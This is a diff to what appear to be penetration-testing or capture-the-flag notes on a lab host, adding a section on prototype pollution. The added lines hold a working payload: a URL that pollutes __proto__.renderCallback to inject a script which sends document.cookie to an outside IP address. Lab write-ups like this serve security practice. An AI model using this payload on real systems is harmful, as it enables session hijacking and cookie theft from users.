@@ -81,3 +81,8 @@ feroxbuster -u http://polution.hsm:3000/ -C 404 --dont-filter
 
 I can login as Guest using the `/dashboard` endpoint
 
+# Prototype polution
+
+```python
+<http://polution.hsm:3000/dashboard#__proto__.renderCallback=<script>document.location='http://10.200.90.87/?data='+document.cookie</script>>
+```
